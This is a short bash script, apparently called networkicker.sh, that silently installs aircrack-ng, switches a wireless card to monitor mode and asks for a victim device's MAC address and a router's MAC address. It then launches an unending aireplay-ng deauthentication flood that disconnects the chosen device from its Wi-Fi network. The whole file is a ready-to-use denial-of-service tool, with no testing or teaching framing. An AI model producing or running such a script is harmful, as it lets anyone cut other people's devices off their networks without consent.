#!/bin/bash
#make sure to run as root
#do chmod+x networkicker.sh
#networkicker.sh
{
sudo apt-get install aircrack-ng
} &>/dev/null
echo "Please input your network interface (do "iwconfig" in another terminal)"
read interface
airmon-ng start $interface 
echo "Are you sure $interface is the correct interface ? Yes/No"
read choice
if [ "$choice" = Yes ]; 
then 
	echo "Ok."
elif [ "$choice" = No ]; 
then 
	echo "Stopping program ...";exit 
else echo "Please answer by yes or no";exit 
fi
echo "Please type the MAC address of the device you want to disconnect"
read devicemac
echo "Please type the router MAC address"
read routermac
echo "Your network card is now in monitor mode. Please run "iwconfig" again and type your network interface"
read newnetworkinterface
sleep 3
echo "Processing ..."
{
aireplay-ng --deauth 0 -c $devicemac -a $routermac $newnetworkinterface
} &>/dev/null
echo "Putting your network card back in normal mode ..."
airmon-ng stop $newnetworkinterface 
echo "Done."
